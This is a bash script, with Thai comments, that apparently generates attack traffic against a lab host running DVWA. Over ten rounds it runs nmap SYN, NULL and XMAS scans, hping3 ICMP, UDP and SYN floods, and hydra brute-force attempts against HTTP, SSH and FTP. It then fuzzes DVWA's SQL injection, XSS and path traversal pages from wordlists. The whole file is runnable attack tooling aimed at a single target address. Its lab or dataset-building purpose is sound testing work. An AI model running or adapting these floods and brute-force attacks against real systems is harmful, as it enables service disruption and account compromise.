#!/bin/bash

TARGET="192.168.122.109"
USERNAME="fruitto"
WORDLIST="clarkson-university-82.txt"
ROUNDS=10

# --- Wordlist ---
cat <<EOF >$WORDLIST
123456
password
admin123
qwerty
root123
111111
letmein
wrongpass1
wrongpass2
wrongpass3
P@ssword
rootroot
EOF

BASE_URL="http://$TARGET/DVWA"
DVWA_USER="admin"
DVWA_PASS="password"
SQL_WORDLIST="SQL-Injection-Wordlist.txt"
XSS_WORDLIST="XSS-Wordlist.txt"
DT_WORDLIST="directory-traversal.txt"

# --- DVWA Login ---
INIT_PAGE=$(curl -s "$BASE_URL/login.php")
USER_TOKEN=$(echo "$INIT_PAGE" | grep -oP '(?<=name="user_token" value=")[^"]*')

RAW_COOKIES=$(curl -s -i \
  -d "username=$DVWA_USER&password=$DVWA_PASS&user_token=$USER_TOKEN&Login=Login" \
  "$BASE_URL/login.php" | grep -i "Set-Cookie")

SESSION_ID=$(echo "$RAW_COOKIES" | grep -oP 'PHPSESSID=\K[^;]*')

if [ -z "$SESSION_ID" ]; then
  echo "[!] DVWA Login failed."
  exit 1
fi

COOKIE_STR="security=low; PHPSESSID=$SESSION_ID"
curl -s -b "$COOKIE_STR" -d "security=low&seclev_submit=Submit" "$BASE_URL/security.php" >/dev/null
echo "[*] DVWA Login สำเร็จ"

# ===== MAIN LOOP: 10 รอบ × 9 steps =====
TOTAL_STEPS=$(( ROUNDS * 9 ))
step=0

echo ""
echo "============================================"
echo " เริ่มทดสอบ: $ROUNDS รอบ × 9 attacks = $TOTAL_STEPS steps"
echo "============================================"

for round in $(seq 1 $ROUNDS); do
  echo ""
  echo "╔══════════════════════════════════════════╗"
  echo "  ROUND $round / $ROUNDS"
  echo "╚══════════════════════════════════════════╝"

  # Step 1: SYN Scan
  step=$(( step + 1 ))
  echo -e "\n[Step $step/$TOTAL_STEPS | Round $round] PortScan: SYN Scan (-sS)"
  sudo nmap -sS --max-retries 1 $TARGET
  sleep 5

  # Step 2: ICMP Flood
  step=$(( step + 1 ))
  echo -e "\n[Step $step/$TOTAL_STEPS | Round $round] DoS: ICMP Flood"
  sudo hping3 --icmp -i u500 -d 256 -c 20000 $TARGET
  sleep 5

  # Step 3: HTTP Brute Force
  step=$(( step + 1 ))
  echo -e "\n[Step $step/$TOTAL_STEPS | Round $round] Brute Force: HTTP (DVWA)"
  hydra -l $USERNAME -P $WORDLIST $TARGET http-get-form \
    "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect." \
    -V -t 4
  sleep 5

  # Step 4: NULL Scan
  step=$(( step + 1 ))
  echo -e "\n[Step $step/$TOTAL_STEPS | Round $round] PortScan: NULL Scan (-sN)"
  sudo nmap -sN --max-retries 1 $TARGET
  sleep 5

  # Step 5: UDP Flood
  step=$(( step + 1 ))
  echo -e "\n[Step $step/$TOTAL_STEPS | Round $round] DoS: UDP Flood"
  sudo hping3 --udp -i u500 -p 53 -d 256 -c 20000 $TARGET
  sleep 5

  # Step 6: SSH Brute Force
  step=$(( step + 1 ))
  echo -e "\n[Step $step/$TOTAL_STEPS | Round $round] Brute Force: SSH"
  hydra -l $USERNAME -P $WORDLIST $TARGET ssh -t 4 -V
  sleep 5

  # Step 7: XMAS Scan
  step=$(( step + 1 ))
  echo -e "\n[Step $step/$TOTAL_STEPS | Round $round] PortScan: XMAS Scan (-sX)"
  sudo nmap -sX --max-retries 1 $TARGET
  sleep 5

  # Step 8: SYN Flood
  step=$(( step + 1 ))
  echo -e "\n[Step $step/$TOTAL_STEPS | Round $round] DoS: SYN Flood"
  sudo hping3 -S -i u500 -p 80 -c 20000 $TARGET
  sleep 5

  # Step 9: FTP Brute Force
  step=$(( step + 1 ))
  echo -e "\n[Step $step/$TOTAL_STEPS | Round $round] Brute Force: FTP"
  hydra -l $USERNAME -P $WORDLIST $TARGET ftp -t 4 -V
  sleep 5

done

# ===== Fuzzing หลังจบลูป (อย่างละ 1 ครั้ง) =====
echo ""
echo "============================================"
echo " Fuzzing: SQLi / XSS / Path Traversal"
echo "============================================"

echo -e "\n[Fuzzing 1/3] SQL Injection..."
while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -b "$COOKIE_STR" \
    "$BASE_URL/vulnerabilities/sqli/?id=${ENCODED}&Submit=Submit")
  echo "[SQLi] Payload: $PAYLOAD | Status: $RESPONSE"
done <"$SQL_WORDLIST"

sleep 5

echo -e "\n[Fuzzing 2/3] XSS..."
while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -b "$COOKIE_STR" \
    "$BASE_URL/vulnerabilities/xss_r/?name=${ENCODED}")
  echo "[XSS] Payload: $PAYLOAD | Status: $RESPONSE"
done <"$XSS_WORDLIST"

sleep 5

echo -e "\n[Fuzzing 3/3] Path Traversal..."
if [ ! -f "$DT_WORDLIST" ]; then
  echo "[!] Wordlist '$DT_WORDLIST' not found."
else
  while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -b "$COOKIE_STR" \
      "$BASE_URL/vulnerabilities/fi/?page=${ENCODED}")
    echo "[DT] Payload: $PAYLOAD | Status: $RESPONSE"
  done <"$DT_WORDLIST"
fi

rm -f $WORDLIST
echo ""
echo "[*] ทดสอบเสร็จสิ้นทั้งหมด"
